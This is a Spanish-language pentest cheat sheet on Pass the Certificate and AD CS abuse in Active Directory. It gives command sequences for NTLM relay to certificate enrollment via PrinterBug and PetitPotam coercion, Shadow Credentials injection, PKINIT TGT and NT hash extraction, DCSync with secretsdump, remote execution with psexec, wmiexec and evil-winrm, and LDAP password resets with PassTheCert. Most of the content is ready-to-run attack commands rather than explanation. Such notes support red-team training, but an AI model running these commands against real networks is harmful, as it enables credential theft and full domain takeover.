# Pass the Certificate (PtC) & Explotación AD CS

## 1. Fundamentos Teóricos

### ¿Qué es Pass the Certificate (PtC)?
Es una técnica de autenticación en la que se utiliza un **certificado digital X.509 (.pfx)** y su clave privada para autenticarse en Active Directory mediante la extensión **PKINIT** de Kerberos (RFC 4556), obteniendo un **Ticket Granting Ticket (TGT)** sin conocer la contraseña ni el hash NTLM de la cuenta.

> **Regla de oro:** Un certificado con la extensión EKU *Client Authentication* equivale funcionalmente a la contraseña en texto claro de esa cuenta.

### Identidades en Active Directory: Usuarios vs Máquinas
En AD, tanto las personas como los equipos son entidades de seguridad (*Security Principals*):
* **Cuentas de Usuario (`usuario`):** Pertenecen a personas o cuentas de servicio. Dan acceso a los recursos y grupos asignados a ese usuario.
* **Cuentas de Máquina (`EQUIPO$`):** Identificadas con el símbolo `$`. Los procesos del sistema (`SYSTEM`) en Windows se autentican en la red usando la cuenta del equipo local. 
  * Una máquina del grupo `Domain Controllers` (`DC01$`) tiene permisos de replicación de directorio (**DCSync**).
  * Una máquina estándar (`PC01$`) puede ser utilizada para ataques de delegación (**RBCD**).

---

## 2. Fase 1: Obtención del Certificado Digital (.pfx)

Existen diversas vías para conseguir el archivo `.pfx` dependiendo del vector de ataque disponible. A continuación se detallan las más comunes:

### Vía 1: Coerción + NTLM Relay a AD CS (HTTP Enrollment)
Se intercepta una autenticación NTLM forzada y se relayea a la web de AD CS (`/certsrv`) para que emita un certificado.


1. **Ponerse a la escucha y hacer relay contra la CA:**
   ```bash
   impacket-ntlmrelayx -t http://<IP_CA>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
   ```
   * `--adcs`: Genera una CSR en nombre de la víctima que se conecte.
   * `--template`: Plantilla con soporte para autenticación de clientes (`Machine`, `User` o `KerberosAuthentication`).

2. **Forzar la autenticación de la víctima:**
   * **Contra un DC (PrinterBug / MS-RPRN):**
 > *Requiere que la máquina objetivo tenga activo el servicio de cola de impresión (Spooler).*

```bash
     python3 printerbug.py CORP.LOCAL/user:password@<IP_DC> <IP_Atacante>
```

   * **Contra otros servidores (PetitPotam / MS-EFSR sin parche):**
 ```bash
     python3 petitpotam.py <IP_Atacante> <IP_Victima>
 ```

3. **Resultado:**
   Se genera y guarda localmente un archivo `.pfx` correspondiente a la cuenta forzada (ej. `DC01$.pfx`):
   ```text
   [*] Writing PKCS#12 certificate to ./DC01$.pfx
   [*] Certificate successfully written to file
   ```

---

### Vía 2: Shadow Credentials (`msDS-KeyCredentialLink`)
Abusa del atributo [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c), el cual almacena claves públicas utilizadas para la autenticación vía PKINIT. Si se poseen permisos de escritura (`GenericAll`, `GenericWrite`, `WriteProperty`) sobre dicho atributo en un usuario o máquina objetivo (auditable con BloodHound), se puede tomar control de esa cuenta.

1. **Inyectar la clave pública y exportar el PFX con `pywhisker`:**
   ```bash
   # Sobre un usuario víctima (ej: jpinkman):
   pywhisker --dc-ip <IP_DC> -d CORP.LOCAL -u <usuario_actual> -p '<pass>' --target jpinkman --action add
   ```

2. **Resultado:**
   La herramienta inyecta la credencial y exporta un archivo `.pfx` junto con su contraseña:
   ```text
   [+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
   [*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
   [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
   ```

---

## 3. Fase 2: De Certificado (.pfx) a Ticket Kerberos (TGT) y Hash NTLM

Independientemente de cómo se haya conseguido el archivo `.pfx` (AD CS Relay, Shadow Credentials, Certipy o volcado de memoria), el procedimiento para autenticarse y extraer credenciales es el mismo:

### Paso A: Obtener el TGT (Ticket Kerberos)
Usamos `gettgtpkinit.py` (de [PKINITtools](https://github.com/dirkjanm/PKINITtools)):

```bash
# Sintaxis general:
# python3 gettgtpkinit.py -cert-pfx <fichero.pfx> [-pfx-pass <pass>] -dc-ip <IP_DC> '<DOMINIO>/<CUENTA>' <ruta_salida_ticket.ccache>

# Ejemplo para USUARIO:
python3 gettgtpkinit.py -cert-pfx ./usuario.pfx -pfx-pass 'clave123' -dc-ip 10.10.10.10 'CORP.LOCAL/jdoe' /tmp/jdoe.ccache

# Ejemplo para MÁQUINA:
python3 gettgtpkinit.py -cert-pfx ./DC01\$.pfx -dc-ip 10.10.10.10 'corp.local/dc01$' /tmp/dc.ccache
```

### Paso B: Extraer el Hash NT de la cuenta (Persistencia / Pass the Hash)
`PKINITtools` incluye un script llamado `getnthash.py` que permite solicitar el **Hash NTLM** de la cuenta utilizando el TGT obtenido previamente y la clave de sesión (AS-REP encryption key). Esto es ideal para no depender de la caducidad del ticket Kerberos:

```bash
python3 getnthash.py -key <AS-REP_Key_obtenida_en_paso_anterior> 'CORP.LOCAL/jdoe'
```
*Esto devuelve el hash NTLM (`aad3b435b51404eeaad3b435b51404ee:...`), permitiendo usar `psexec`, `evil-winrm`, `secretsdump` o Pass-the-Hash tradicional.*

---

## 4. Fase 3: Pass the Ticket (Acontecer PtT y Explotación según Cuenta)

Una vez obtenido el ticket Kerberos (`.ccache`), lo cargamos en la variable de entorno de la sesión:

```bash
export KRB5CCNAME=/tmp/<ticket>.ccache
```

A partir de este momento, las herramientas con soporte de Kerberos utilizarán este ticket para autenticarse. Las acciones a realizar dependen del rol y privilegios de la cuenta comprometida:

### Caso 1: Cuenta de Usuario Administrador (Domain Admin / Local Admin)
Si el certificado pertenece a un usuario con privilegios administrativos sobre uno o más equipos:

```bash
# Ejecución remota vía WinRM (Evil-WinRM con Kerberos):
evil-winrm -i target.corp.local -r corp.local

# Ejecución remota vía WMI o SMB (Impacket con -k -no-pass):
impacket-wmiexec -k -no-pass 'CORP.LOCAL/Administrator'@target.corp.local
impacket-psexec -k -no-pass 'CORP.LOCAL/Administrator'@target.corp.local

# Dumpear credenciales locales (SAM / LSA) o del DC:
impacket-secretsdump -k -no-pass 'CORP.LOCAL/Administrator'@target.corp.local
```

### Caso 2: Cuenta de Usuario Estándar
Si el certificado pertenece a un usuario sin privilegios administrativos:
* **Acceso a recursos internos:** Acceder a recursos compartidos SMB confidenciales, servidores SharePoint, bases de datos MSSQL:
  ```bash
  impacket-mssqlclient -k -no-pass 'CORP.LOCAL/jdoe'@sqlserver.corp.local
  impacket-smbclient -k -no-pass 'CORP.LOCAL/jdoe'@fileserver.corp.local
  ```
* **Enumeración profunda:** Consultar Active Directory sin restricciones anónimas (BloodHound, ldapdomaindump).
* **Movimiento Lateral:** Conectarse por WinRM o RDP si el usuario pertenece a grupos locales de acceso en estaciones de trabajo.

### Caso 3: Cuenta de Controlador de Dominio (`DC$`)
Si el certificado pertenece a un Domain Controller (por ejemplo mediante coerción NTLM):
* Los DCs tienen privilegios de replicación (`DS-Replication-Get-Changes-All`).
* Permite volcar directamente los hashes de todo el dominio mediante DCSync sin conocer la contraseña del administrador:

```bash
impacket-secretsdump -k -no-pass -dc-ip 10.10.10.10 -just-dc-user Administrator 'CORP.LOCAL/DC01$'@DC01.CORP.LOCAL
```

### Caso 4: Cuenta de Máquina Estándar (`WORKSTATION$` o `SERVER$`)
Si capturamos el certificado de un servidor miembro o estación de trabajo común:
* **RBCD (Resource-Based Constrained Delegation):** Usar la cuenta de máquina para configurar delegación en equipos donde tengamos permisos y comprometerlos.
* **Leer LAPS:** Comprobar si la máquina o cuentas de servicio asociadas tienen permiso de lectura sobre contraseñas LAPS en AD.
* **Acceso a recursos de red:** Muchas máquinas tienen acceso de lectura a compartidos de red donde se guardan scripts, backups o configuraciones.

---

## 5. Alternativa: ¿Qué hacer si PKINIT no está disponible? (PassTheCert)
Si el KDC de Kerberos no soporta autenticación por certificados (ej. el DC carece de certificado KDC):
* No se puede generar un TGT con `gettgtpkinit`.
* Se utiliza [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) para autenticarse directamente contra el servicio **LDAPS** mediante TLS (Schannel con certificado de cliente):

```bash
# Cambiar la contraseña del usuario/máquina directamente en LDAP usando el certificado:
python3 passthecert.py -action modify_user -crt cert.crt -key cert.key -domain corp.local -dc-ip <IP_DC> -target jdoe -new-pass 'NuevaPassword123!'
```

---

## 6. Configuración de Entorno & Dependencias (Troubleshooting)

Para evitar conflictos de librerías criptográficas con `PKINITtools` y `ntlmrelayx`:

```bash
# Entorno virtual para PKINITtools
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt

# Solución común al error "Detecting the version of libcrypto":
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

### Troubleshooting NTLM Relay Attack (Impacket)
Si la versión del sistema de Impacket da problemas con la opción `--adcs`:
```bash
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m venv .venv
source .venv/bin/activate
pip3 install .
```
